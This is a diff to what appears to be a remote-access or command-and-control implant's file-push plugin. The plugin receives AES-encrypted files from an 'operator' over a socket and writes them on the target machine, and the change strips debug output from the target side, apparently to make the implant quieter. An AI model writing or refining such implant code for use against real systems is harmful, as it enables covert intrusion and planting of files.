@@ -79,14 +79,13 @@ class PushCommand(CommandPlugin):
         try:
             command, operatorPath, targetPath = argv
         except:
-            print("Error: couldn't parse command. Please check args and try again")
+            # Error: couldn't parse command. Please check args and try again
             return
         # expand '..', '.', and '~' to full path and remove trailing /'s
         p = pathlib.Path(targetPath)
         targetPath = str(p.resolve())
         # get name of file to be saved
         shortname, nameFromOperator = PushCommand.getShortname(operatorPath, targetPath)
-        print(f"Name from Operator: {nameFromOperator}")
         # send ready-to-receive signal
         cipher = AES.new(cipherKey, AES.MODE_EAX)
         nonce = cipher.nonce
@@ -106,7 +105,6 @@ class PushCommand(CommandPlugin):
             print("Error message from operator: '{errorMessage}'. Please check args and try again")
             return
         # make directories that don't exist yet and open file for receiving
-        print(f"Name from Operator: {nameFromOperator}")
         if nameFromOperator:
             try:
                 os.makedirs(targetPath)
@@ -129,7 +127,6 @@ class PushCommand(CommandPlugin):
         socket.sendall(ciphertext)
         # start receiving file
         progress = 0
-        print(f"File size: {filesize}")
         while True:
             # receive file chunk (up to 2KB at a time)
             buffersize = min(2048, filesize-progress)
@@ -147,7 +144,6 @@ class PushCommand(CommandPlugin):
             bytesRead = cipher.decrypt(ciphertext)
             pulledFile.write(bytesRead)
             progress += len(bytesRead)
-            print(f"Received {len(bytesRead)} bytes -- Progress: {progress}")
             if progress >= filesize:
                 # done receiving file
                 break
@@ -163,7 +159,6 @@ class PushCommand(CommandPlugin):
         if operatorPath != targetPath:
             # if targetPath is a directory, get file name from operatoPath
             if os.path.isdir(targetPath):
-                print(f"Target path: {targetPath}")
                 shortname, _ = PushCommand.getShortname(operatorPath, operatorPath)
                 fromOperator = True
                 return (shortname, fromOperator)
@@ -174,7 +169,6 @@ class PushCommand(CommandPlugin):
             shortname = targetPath[targetPath.rindex("\\"):]
         else:
             shortname = targetPath
-        print(f"From Operator: {fromOperator}")
         return (shortname, fromOperator)
 
     def windowsTarget(argv, socket, cipherKey):
